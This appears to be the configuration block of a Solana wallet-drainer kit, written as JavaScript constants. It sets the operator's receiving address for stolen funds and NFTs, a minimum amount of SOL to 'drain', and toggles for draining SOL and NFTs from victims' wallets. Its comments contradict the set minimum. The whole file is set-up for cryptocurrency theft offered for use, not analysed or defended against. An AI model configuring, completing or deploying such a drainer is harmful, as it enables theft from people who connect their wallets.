/*   = = = = = YOUR WALLET ADRESS = = = = =   */
const receiveAddress = "BK4c52op1uUx3WT7ubE7frLpxd8kk6kGuPKe5WgGoh4M"; // Adress where you want to receive money/nfts

/*   = = = = = AMOUNT = = = = =   */
const amount = {
    minimal: 0.01 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
}

/*   = = = = = MODES = = = = =   */
const active = {
    solana: true, // To drain sol, remove this line if you only want to drain NFTs
    nfts: true, // To Drain nfts, remove this line if you only want to drain Solana
}
